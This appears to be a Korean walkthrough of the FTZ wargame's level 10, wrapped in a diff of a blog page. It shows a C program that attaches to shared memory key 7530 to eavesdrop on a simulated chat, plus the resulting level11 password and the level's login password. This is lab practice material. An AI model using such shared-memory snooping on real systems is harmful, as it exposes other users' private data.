@@ -1,0 +1,63 @@
+I"�<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>login as: level10 
+level10@~~~~<span class="s1">'s password: 
+[level10@ftz level10]$ ls 
+hint  program  public_html  tmp 
+[level10@ftz level10]$ cat hint 
+
+
+두명의 사용자가 대화방을 이용하여 비밀스런 대화를 나누고 있다. 
+그 대화방은 공유 메모리를 이용하여 만들어졌으며, 
+key_t의 값은 7530이다. 이를 이용해 두 사람의 대화를 도청하여 
+level11의 권한을 얻어라. 
+
+- 레벨을 완료하셨다면 소스는 지우고 나가주세요. 
+
+
+[level10@ftz level10]$
+</span></code></pre></div></div>
+
+<p>level10/interesting to hack!으로 접속하자. 
+hint를 보니 공유 메모리를 이용한 문제인 듯 하다.
+공유 메모리는 이런 것이다.</p>
+
+<p>https://ko.wikipedia.org/wiki/%EA%B3%B5%EC%9C%A0_%EB%A9%94%EB%AA%A8%EB%A6%AC</p>
+
+<p>공유 메모리를 이용한 C 코드 예시이다.</p>
+
+<p>http://m.blog.naver.com/bitnang/70172711414</p>
+
+<p>이것을 이용해서 공유 메모리에 접근하는 코드를 짜 보자.
+참고로 프로그래밍 할 때에는 /tmp로 들어와서 하자.
+그 이외에서는 프로그래밍이 권한상 되지 않는다.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include&lt;stdio.h&gt;
+#include&lt;sys/shm.h&gt; 
+#include&lt;sys/ipc.h&gt; 
+#include&lt;sys/types.h&gt; 
+</span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> 
+<span class="p">{</span> 
+        <span class="kt">int</span> <span class="n">shmid</span><span class="p">;</span> 
+        <span class="kt">char</span><span class="o">*</span> <span class="n">shared_memory</span><span class="p">;</span> 
+        <span class="n">shmid</span><span class="o">=</span><span class="n">shmget</span><span class="p">(</span><span class="mi">7530</span><span class="p">,</span><span class="mi">1024</span><span class="p">,</span><span class="mo">0666</span><span class="p">);</span> <span class="c1">//7530:ket_t 값 1024:일어올 크기 0666:접근할 권한이라고 알면 된다.</span>
+        <span class="n">shared_memory</span><span class="o">=</span><span class="n">shmat</span><span class="p">(</span><span class="n">shmid</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span> <span class="c1">//shmid에 넣어준 정보의 공유메모리 값을 얻어온다.</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"shared_memory is : %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">shared_memory</span><span class="p">);</span> <span class="c1">//값 출력</span>
+        <span class="n">shmdt</span><span class="p">(</span><span class="n">shared_memory</span><span class="p">);</span> <span class="c1">//공유메모리 접근을 끊는다.</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> 
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>컴파일 후 실행시키자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level10@ftz tmp]<span class="nv">$ </span>vi m.c 
+<span class="o">[</span>level10@ftz tmp]<span class="nv">$ </span>gcc <span class="nt">-o</span> m m.c 
+<span class="o">[</span>level10@ftz tmp]<span class="nv">$ </span>./m 
+shared_memory is : 멍멍: level11의 패스워드는? 
+구타: what!@#<span class="nv">$?</span> 
+
+<span class="o">[</span>level10@ftz tmp]<span class="err">$</span>
+</code></pre></div></div>
+
+<p>답이 나왔다.</p>
+
+<p>level11’s password:”what!@#$?”</p>
+:ET
